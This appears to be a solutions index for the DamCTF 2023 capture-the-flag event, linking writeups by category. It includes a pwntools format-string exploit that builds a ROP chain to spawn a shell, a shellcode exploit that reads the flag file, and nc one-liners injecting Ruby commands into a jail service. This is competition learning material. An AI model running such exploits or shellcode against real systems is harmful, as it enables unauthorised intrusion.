---
title: DamCTF 2023
weight: 0
---

# DamCTF 2023
- [CTFTime](https://ctftime.org/event/1872)
- [GitLab](https://gitlab.com/osusec/damctf-2023-challenges/-/tree/main/)

## **Binary**
### baby-review
- https://github.com/12throckyou/ctf-writeups/blob/main/damctf/pwn/baby-review/README.md
- https://rektedekte.github.io/CTF-writeups/DamCTF%202023/baby-review/

{{< details title="crusom#5664" open=false >}}
```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./baby-review_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = ['st']

#r = process([exe.path])
#r = gdb.debug([exe.path])
r = remote('chals.damctf.xyz', 30888)


def main():
    print(r.recvlines(2))
    capital = input()
    r.sendline(str.encode(capital))

    r.sendlineafter(b"Exit", b"5")
    # %8$p is 0x7fffffffddd0
    # saved rip is 0x7fffffffddd8 
    r.sendlineafter(b"list", b"%3$p.%8$p")
    r.sendlineafter(b"Exit", b"2")
    r.readlines(6)

    leaked = r.recvline().strip()
    addr_in_libc = int(leaked[2:2+12], 16)
    stack_rip    = int(leaked[15:], 16) 
    print(hex(addr_in_libc))
    print(hex(stack_rip))

    off = 0x114a37
    libc.address = addr_in_libc - off
    
    binsh = next(libc.search(b'/bin/sh\0'))
    print("binsh: " + str(hex(binsh)))

    pop_rdi_ret = libc.address + 0x002a3e5
    print("pop_rdi: " + str(hex(pop_rdi_ret)))
    print("system: " + str(hex(libc.symbols['system'])))

    print("writing binsh to: " + str(hex(stack_rip + 16)))
    print("writing system to: " + str(hex(stack_rip + 24)))
    
    offset = 10
    ret = libc.address + 0x00029cd6
    writes = {
        stack_rip + 8: ret,
        stack_rip + 16: pop_rdi_ret,
        stack_rip + 24: binsh,
        stack_rip + 32: libc.symbols['system'],
    }

    payload = fmtstr_payload(offset, writes, write_size='short')

    r.sendlineafter(b"Exit", b"5")
    r.sendlineafter(b"list", payload)
    r.sendlineafter(b"Exit", b"2")

    r.sendlineafter(b"Exit", b"4")
    r.sendline(b'a')
    r.interactive()

if __name__ == "__main__":
    main()
```
{{< /details>}}
### golden-banana
- https://rektedekte.github.io/CTF-writeups/DamCTF%202023/golden-banana/
### hacky-halls
### interrupting-muffin-kicker
- https://gitlab.com/osusec/damctf-2023-challenges/-/blob/main/binary/interrupting-muffin-kicker/README.md
### muffin-kicker
- https://hiumee.com/posts/DamCTF-Muffin-Kicker/
- https://gitlab.com/osusec/damctf-2023-challenges/-/blob/main/binary/muffin-kicker/README.md
### scm
{{< details title="captainGeech#8300" open=false >}}
```python
#!/usr/bin/env python

import os
import sys

from pwn import *

HOST = "chals.damctf.xyz"
PORT = 30200

BINARY_PATH = "../scm"
LIBC_PATH = "./libc.so.6"

elf = ELF(BINARY_PATH)
context.binary = elf
context.arch = elf.arch
rop = ROP(elf)

if os.path.exists(LIBC_PATH):
    log.debug("loading chal libc")
    libc = ELF(LIBC_PATH)
else:
    log.debug("loading system libc")
    libc = ELF("/usr/lib/libc.so.6")

# p: pwnlib.tubes.tube

def get_cxn():
    if "remote" in sys.argv:
        return remote(HOST, PORT)

    tmp_path=BINARY_PATH
    # pwninit --no-template --bin testbin --libc libc.so.6
    if os.path.exists(BINARY_PATH+"_patched"):
        tmp_path += "_patched"

    p = process(tmp_path)

    if "debug" in sys.argv:
        context.terminal = ["tmux", "splitw", "-h"]
        gdb.attach(p, "\n".join([
            # GDB commands here
            "set follow-fork-mode child",
            "break scm.c:68",
            "break scm.c:159"
        ]))

    return p

shellcode_1 = asm(r"""
    // open the file
    xor %rdx, %rdx
    push %rdx
    push 0x67616c66
    mov %rdi, %rsp
    mov %rsi, %rdx
    mov %rax, %rdx
    push 0x2
    pop %rax
    syscall
    
    // save the fd
    mov %rdi, %rax

    // get the buf location
    call $+5
    pop %rbx
    and %bx, 0xf000
    add %rbx, 0x800

    // read in the flag
    mov %rsi, %rbx
    push 0x80
    pop %rdx
    xor %rax, %rax
    syscall

    // exit
    push 0xe7
    pop %rax
    xor %rdi, %rdi
    syscall
""")

shellcode_2 = asm(r"""
    // get the flag location
    call $+5
    pop %rbx
    and %bx, 0xf000
    add %rbx, 0x1800

    // write to stdout
    xor %rax, %rax
    inc %rax
    mov %rdi, %rax
    mov %rsi, %rbx
    push 0x80
    pop %rdx
    syscall

    // exit
    push 0xe7
    pop %rax
    xor %rdi, %rdi
    syscall
""")

def new_sc(t, sc):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b": ", str(t).encode())
    p.sendlineafter(b": ", str(len(sc)).encode())
    p.sendlineafter(b": ", sc)

def exec_sc(idx):
    p.sendlineafter(b"Choice: ", b"3")
    p.sendlineafter(b": ", str(idx).encode())

def edit_sc(idx, new_type=None, new_sc=None):
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b": ", str(idx).encode())

    if new_type is not None:
        p.sendlineafter(b": ", b"y")
        p.sendlineafter(b": ", str(new_type).encode())
    else:
        p.sendlineafter(b": ", b"n")

    if new_sc is not None:
        p.sendlineafter(b": ", b"y")
        p.sendlineafter(b": ", str(len(new_sc)).encode())
        p.sendlineafter(b": ", new_sc)
    else:
        p.sendlineafter(b": ", b"n")

def pwn():
    global p
    p = get_cxn()

    new_sc(1, shellcode_1)
    new_sc(3, shellcode_2)
    edit_sc(0, new_type=0x101)
    exec_sc(0)
    exec_sc(1)

    print(p.recvall(timeout=1))
    # p.interactive()

if __name__ == "__main__":
    pwn()
```
{{< /details>}}


## **Crypto**
### blazing-ot
{{< details title="Lance Roy#5398" open=false >}}
``` txt
The blazing-ot challenge was an implementation of https://eprint.iacr.org/2020/110 , which says "To securely realize OT extension efficiently, we consider a UC-secure base-OT functionality that allows selective failure attack by a corrupt sender." In the challenge, the player takes the role of the sender, and can perform this attack. Note that this isn't an issue with the paper, as they use it in the context of OT extension, where they show that the selective failure attack doesn't matter. 
```
{{< /details>}}
### crack-the-key
- https://github.com/BrilliantDeviation7/ctf-writeups/blob/main/crack-the-key.md
### gpt-encrypt
### sha-mac

## **Misc**
### de-compressed
- https://siunam321.github.io/ctf/DamCTF-2023/
- https://ctftime.org/writeup/36731
### forget-me-not
### incharcerated
{{< details title="Yazuko#6967" open=false >}}
``` bash
echo -e 'ls=input.to_s ; exec ls ' | nc chals.damctf.xyz 31313
echo -e 'a=system.split.each; puts a.next;puts a.next;puts a.next;puts a.next; puts a.next; puts a.next; b = a.next; puts b; c=open b; puts c.read' | nc chals.damctf.xyz 31313
```
{{< /details>}}
### mesothelioma


## **Web**
### tcl-tac-toe
- https://siunam321.github.io/ctf/DamCTF-2023/
- https://ctftime.org/writeup/36740
- https://ctftime.org/writeup/36734
### thunderstruck
- https://github.com/apolloteapot/ctf-writeups/tree/main/DamCTF2023/thunderstruck
- https://ctftime.org/writeup/36738
- https://ctftime.org/writeup/36739
### url-stored-notes
- https://siunam321.github.io/ctf/DamCTF-2023/
- https://ctftime.org/writeup/36741
- https://blog.hamayanhamayan.com/#web-url-stored-notes
